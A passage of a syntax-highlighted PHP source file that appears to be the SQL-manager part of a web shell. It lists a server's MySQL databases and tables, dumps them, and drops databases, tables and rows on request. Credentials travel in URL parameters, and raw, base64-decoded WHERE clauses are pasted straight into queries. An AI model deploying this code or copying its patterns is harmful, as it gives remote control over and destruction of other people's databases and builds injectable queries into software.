<span class="lineno"> 421</span> <span class="k">if</span><span class="p">(</span><span class="nv">$serv</span><span class="p">){</span><span class="nv">$status</span><span class="o">=</span><span class="s2">&quot;Connected. :: &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&#39;&gt;Log out&lt;/a&gt;&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$status</span><span class="o">=</span><span class="s2">&quot;Disconnected.&quot;</span><span class="p">;}</span>
<span class="lineno"> 422</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&lt;font color=green&gt;Status: </span><span class="si">$status</span><span class="s2">&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="c1"># #D7FFA8</span>
<span class="lineno"> 423</span> <span class="k">print</span> <span class="s2">&quot;&lt;table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8&gt;&lt;tr&gt;&lt;td valign=top&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 424</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;font color=red&gt;[db]&lt;/font&gt;&lt;Br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 425</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=white&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 426</span> <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$serv</span><span class="p">);</span>
<span class="lineno"> 427</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$str</span><span class="o">=</span><span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
<span class="lineno"> 428</span> <span class="k">print</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;delete_db=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;[DEL]&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$str[0]</span><span class="s2">&amp;dump_db=</span><span class="si">$str[0]</span><span class="s2">&amp;f_d=</span><span class="si">$d</span><span class="s2">&#39;&gt;[DUMP]&lt;/a&gt;&lt;/a&gt; &lt;b&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?baza=1&amp;db=</span><span class="si">$str[0]</span><span class="s2">&amp;p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&#39;&gt;</span><span class="si">$str[0]</span><span class="s2">&lt;/a&gt;&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 429</span> <span class="nv">$tc</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 430</span> <span class="p">}</span>
<span class="lineno"> 431</span> <span class="nv">$baza</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;baza&#39;</span><span class="p">];</span>
<span class="lineno"> 432</span> <span class="nv">$db</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">];</span>
<span class="lineno"> 433</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=red&gt;[Total db: </span><span class="si">$tc</span><span class="s2">]&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 434</span> <span class="k">if</span><span class="p">(</span><span class="nv">$baza</span><span class="p">){</span>
<span class="lineno"> 435</span> <span class="k">print</span> <span class="s2">&quot;&lt;div align=left&gt;&lt;font color=green&gt;db: [</span><span class="si">$db</span><span class="s2">]&lt;/div&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 436</span> <span class="nv">$result</span><span class="o">=@</span><span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$db</span><span class="p">);</span>
<span class="lineno"> 437</span> <span class="k">while</span><span class="p">(</span><span class="nv">$str</span><span class="o">=@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
<span class="lineno"> 438</span> <span class="nv">$c</span><span class="o">=</span><span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM </span><span class="si">$str[0]</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 439</span> <span class="nv">$records</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 440</span> 
<span class="lineno"> 441</span> <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">&gt;</span><span class="nv">$s4ot</span><span class="p">){</span><span class="nv">$s4ot</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]);}</span>
<span class="lineno"> 442</span> <span class="k">if</span><span class="p">(</span><span class="nv">$records</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;0&quot;</span><span class="p">){</span>
<span class="lineno"> 443</span> <span class="k">print</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;delete_table=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39; title=&#39;Delete </span><span class="si">$str[0]</span><span class="s2">?&#39;&gt;[D]&lt;/a&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1&amp;rename_table=</span><span class="si">$str[0]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$str[0]</span><span class="s2">&#39;&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[</span><span class="si">$records[0]</span><span class="s2">]&lt;/font&gt; &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?vnutr=1&amp;p=sql&amp;vn=</span><span class="si">$str[0]</span><span class="s2">&amp;baza=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&amp;ins_new_line=1&#39;&gt;</span><span class="si">$str[0]</span><span class="s2">&lt;/a&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 444</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno"> 445</span> <span class="k">print</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;delete_table=</span><span class="si">$str[0]</span><span class="s2">&#39; onclick=&#39;return confirm(</span><span class="se">\&quot;</span><span class="s2">DELETE </span><span class="si">$str[0]</span><span class="s2"> ?</span><span class="se">\&quot;</span><span class="s2">)&#39; title=&#39;Delete </span><span class="si">$str[0]</span><span class="s2">?&#39;&gt;[D]&lt;/a&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1&amp;rename_table=</span><span class="si">$str[0]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$str[0]</span><span class="s2">&#39;&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[</span><span class="si">$records[0]</span><span class="s2">]&lt;/font&gt; &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?vnutr=1&amp;p=sql&amp;vn=</span><span class="si">$str[0]</span><span class="s2">&amp;baza=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;tbl=</span><span class="si">$str[0]</span><span class="s2">&#39;&gt;</span><span class="si">$str[0]</span><span class="s2">&lt;/a&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 446</span> <span class="p">}</span>
<span class="lineno"> 447</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 448</span> <span class="nv">$total_t</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 449</span> <span class="p">}</span>
<span class="lineno"> 450</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;B&gt;&lt;font color=red&gt;Total tables: </span><span class="si">$total_t</span><span class="s2">&lt;/font&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 451</span>                                 <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 452</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$s4ot</span><span class="o">+</span><span class="mi">10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="k">print</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;}</span>
<span class="lineno"> 453</span>                                 <span class="k">print</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 454</span> <span class="p">}</span> <span class="c1">#end baza</span>
<span class="lineno"> 455</span> 
<span class="lineno"> 456</span> 
<span class="lineno"> 457</span> 
<span class="lineno"> 458</span> 
<span class="lineno"> 459</span> <span class="c1"># delete table</span>
<span class="lineno"> 460</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$delete_table</span><span class="p">)){</span>
<span class="lineno"> 461</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 462</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE IF EXISTS </span><span class="si">$delete_table</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 463</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Table [ </span><span class="si">$delete_table</span><span class="s2"> ] :: Deleted success!&lt;/font&gt;&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 464</span> <span class="k">print</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;db=</span><span class="si">$db</span><span class="s2">&amp;baza=1</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 465</span> <span class="p">}</span>
<span class="lineno"> 466</span> <span class="c1"># end of delete table</span>
<span class="lineno"> 467</span> 
<span class="lineno"> 468</span> <span class="c1"># delete database</span>
<span class="lineno"> 469</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">])){</span>
<span class="lineno"> 470</span> <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 471</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Database &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_db&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; :: Deleted Success!&quot;</span><span class="p">;</span>
<span class="lineno"> 472</span> <span class="k">print</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 473</span> <span class="p">}</span>
<span class="lineno"> 474</span> <span class="c1"># end of delete database</span>
<span class="lineno"> 475</span> 
<span class="lineno"> 476</span> <span class="c1"># delete row</span>
<span class="lineno"> 477</span> <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">])){</span>
<span class="lineno"> 478</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">]);</span>
<span class="lineno"> 479</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DELETE FROM &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno"> 480</span> <span class="nv">$del_result</span> <span class="o">=</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Deleted Success!&lt;br&gt;&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;delete_row&#39;</span><span class="p">];</span>
<span class="lineno"> 481</span> <span class="k">print</span> <span class="s2">&quot;&lt;meta http-equiv=</span><span class="se">\&quot;</span><span class="s2">REFRESH</span><span class="se">\&quot;</span><span class="s2"> content=</span><span class="se">\&quot;</span><span class="s2">5;URL=</span><span class="si">$php_self</span><span class="s2">?p=sql&amp;login=</span><span class="si">$login</span><span class="s2">&amp;pass=</span><span class="si">$pass</span><span class="s2">&amp;adress=</span><span class="si">$adress</span><span class="s2">&amp;conn=1&amp;vnutr=1&amp;baza=1&amp;vn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vn&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;db=</span><span class="si">$db</span><span class="s2">&amp;tbl=</span><span class="si">$tbl\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 482</span> <span class="s2">}</span>
<span class="lineno"> 483</span> <span class="s2"># end of delete row</span>
<span class="lineno"> 484</span> 
<span class="lineno"> 485</span> 
<span class="lineno"> 486</span> <span class="si">$vn</span><span class="s2">=</span><span class="si">$_GET[&#39;vn&#39;]</span><span class="s2">;</span>
<span class="lineno"> 487</span> <span class="s2">print &quot;</span><span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">valign</span><span class="o">=</span><span class="nx">top</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 488</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&gt;</span><span class="nx">Database</span><span class="o">:</span> <span class="nv">$db</span> <span class="o">=&gt;</span> <span class="nv">$vn</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 489</span> 
<span class="lineno"> 490</span> <span class="s2"># edit row</span>
<span class="lineno"> 491</span> <span class="s2">if(isset(</span><span class="si">$_POST[&#39;edit_row&#39;]</span><span class="s2">)){</span>
<span class="lineno"> 492</span> <span class="si">$edit_row</span><span class="s2">=base64_decode(</span><span class="si">$_POST[&#39;edit_row&#39;]</span><span class="s2">);</span>
<span class="lineno"> 493</span> 
<span class="lineno"> 494</span> <span class="si">$r_edit</span><span class="s2"> = mysql_query(&quot;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nv">$tbl</span> <span class="nx">WHERE</span> <span class="nv">$edit_row</span><span class="s2">&quot;) or die(&quot;</span><span class="o">&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&gt;</span><span class="s2">&quot;.mysql_error().&quot;</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;</span><span class="s2">&quot;);</span>
<span class="lineno"> 495</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 496</span>        <span class="o">&lt;</span><span class="nx">table</span> <span class="nx">border</span><span class="o">=</span><span class="mi">0</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="mi">1</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;&lt;</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno"> 497</span>        <span class="o">&lt;</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Row</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Value</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 498</span> <span class="s2">print  &quot;</span><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span> <span class="nx">action</span><span class="o">=</span><span class="s1">&#39;$php_self?p=sql&amp;login=&quot;.$_GET[&#39;</span><span class="nx">login</span><span class="s1">&#39;].&quot;&amp;pass=&quot;.$_GET[&#39;</span><span class="nx">pass</span><span class="s1">&#39;].&quot;&amp;adress=&quot;.$_GET[&#39;</span><span class="nx">adress</span><span class="s1">&#39;].&quot;&amp;conn=1&amp;baza=1&amp;tbl=&quot;.$_GET[&#39;</span><span class="nx">tbl</span><span class="s1">&#39;].&quot;&amp;vn=&quot;.$_GET[&#39;</span><span class="nx">vn</span><span class="s1">&#39;].&quot;&amp;db=&quot;.$_GET[&#39;</span><span class="nx">db</span><span class="s1">&#39;].&quot;&#39;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 499</span> <span class="s2">print  &quot;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">edit_row</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;&quot;.$_POST[&#39;</span><span class="nx">edit_row</span><span class="s1">&#39;].&quot;&#39;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 500</span> <span class="s2">print &quot;</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">radio</span> <span class="nx">name</span><span class="o">=</span><span class="nx">upd</span> <span class="nx">value</span><span class="o">=</span><span class="nx">update</span> <span class="nx">checked</span><span class="o">&gt;</span><span class="nx">Update</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="lineno"> 501</span>         <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">radio</span> <span class="nx">name</span><span class="o">=</span><span class="nx">upd</span> <span class="nx">value</span><span class="o">=</span><span class="nx">insert</span><span class="o">&gt;</span><span class="nx">Insert</span> <span class="k">new</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 502</span> 
<span class="lineno"> 503</span> 
<span class="lineno"> 504</span> <span class="si">$i</span><span class="s2">=0;</span>
<span class="lineno"> 505</span> <span class="s2">while(</span><span class="si">$mn</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$r_edit</span><span class="s2">, MYSQL_ASSOC)){</span>
<span class="lineno"> 506</span> <span class="s2">foreach(</span><span class="si">$mn</span><span class="s2"> as </span><span class="si">$key</span><span class="s2"> =&gt;</span><span class="si">$val</span><span class="s2">){</span>
<span class="lineno"> 507</span> <span class="si">$type</span><span class="s2">  = mysql_field_type(</span><span class="si">$r_edit</span><span class="s2">, </span><span class="si">$i</span><span class="s2">);</span>
<span class="lineno"> 508</span> <span class="si">$len</span><span class="s2">  = mysql_field_len(</span><span class="si">$r_edit</span><span class="s2">, </span><span class="si">$i</span><span class="s2">);</span>
<span class="lineno"> 509</span> <span class="si">$del</span><span class="s2"> .= &quot;</span><span class="sb">`$key`</span><span class="o">=</span><span class="s1">&#39;&quot;.adds($val).&quot;&#39;</span> <span class="k">AND</span> <span class="s2">&quot;;</span>
<span class="lineno"> 510</span> <span class="si">$c</span><span class="s2">=strlen(</span><span class="si">$val</span><span class="s2">);</span>
<span class="lineno"> 511</span> <span class="si">$val</span><span class="s2">=htmlspecialchars(</span><span class="si">$val</span><span class="s2">, ENT_NOQUOTES);</span>
<span class="lineno"> 512</span> <span class="si">$str</span><span class="s2">=&quot;</span> <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;$key&#39;</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">39</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">5</span><span class="o">&gt;</span><span class="nv">$val</span><span class="o">&lt;/</span><span class="nx">textarea</span><span class="o">&gt;</span> <span class="s2">&quot;;</span>
<span class="lineno"> 513</span> <span class="si">$buff</span><span class="s2"> .= &quot;</span><span class="o">&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="nx">silver</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$key</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">green</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nv">$type</span><span class="p">(</span><span class="nv">$len</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">font</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;</span><span class="nx">td</span><span class="o">&gt;</span><span class="nv">$str</span><span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 514</span> <span class="si">$i</span><span class="s2">++;</span>
<span class="lineno"> 515</span> <span class="s2">}</span>
<span class="lineno"> 516</span> 
<span class="lineno"> 517</span> <span class="s2">}</span>
<span class="lineno"> 518</span> <span class="si">$delstring</span><span class="s2">=base64_encode(</span><span class="si">$del</span><span class="s2">);</span>
<span class="lineno"> 519</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">delstring</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$delstring\</span><span class="s2">&quot;</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 520</span> <span class="s2">print &quot;</span><span class="nv">$buff</span><span class="o">&lt;/</span><span class="nx">table</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 521</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 522</span> <span class="s2">if(!</span><span class="si">$_POST[&#39;makeupdate&#39;]</span><span class="s2">){print &quot;</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Update</span> <span class="nx">name</span><span class="o">=</span><span class="nx">makeupdate</span><span class="o">&gt;&lt;/</span><span class="nx">form</span><span class="o">&gt;</span><span class="s2">&quot;;}</span>
<span class="lineno"> 523</span> 
<span class="lineno"> 524</span> 
<span class="lineno"> 525</span> 
<span class="lineno"> 526</span> 
<span class="lineno"> 527</span> <span class="s2">if(</span><span class="si">$_POST[&#39;makeupdate&#39;]</span><span class="s2">){</span>
<span class="lineno"> 528</span> <span class="s2">if(</span><span class="si">$_POST[&#39;upd&#39;]</span><span class="s2">==&#39;update&#39;){</span>
<span class="lineno"> 529</span> <span class="s2">preg_match_all(&quot;</span><span class="o">/</span><span class="nx">name</span><span class="o">=</span><span class="s1">&#39;(.*?)&#39;</span><span class="nx">\scols</span><span class="o">=</span><span class="mi">39</span><span class="nx">\srows</span><span class="o">=</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">(</span><span class="o">.*?</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">\</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&gt;/</span><span class="nx">i</span><span class="s2">&quot;,</span><span class="si">$buff</span><span class="s2">,</span><span class="si">$matches3</span><span class="s2">);</span>
<span class="lineno"> 530</span> <span class="si">$delstring</span><span class="s2">=</span><span class="si">$_POST[&#39;delstring&#39;]</span><span class="s2">;</span>
<span class="lineno"> 531</span> <span class="si">$delstring</span><span class="s2">=base64_decode(</span><span class="si">$delstring</span><span class="s2">);</span>
<span class="lineno"> 532</span> <span class="si">$delstring</span><span class="s2"> = substr(</span><span class="si">$delstring</span><span class="s2">, 0, strlen(</span><span class="si">$delstring</span><span class="s2">)-5);</span>
<span class="lineno"> 533</span> 
<span class="lineno"> 534</span> <span class="s2">for(</span><span class="si">$i</span><span class="s2">=0; </span><span class="si">$i</span><span class="s2">&lt;count(</span><span class="si">$matches3[0]</span><span class="s2">); </span><span class="si">$i</span><span class="s2">++){</span>
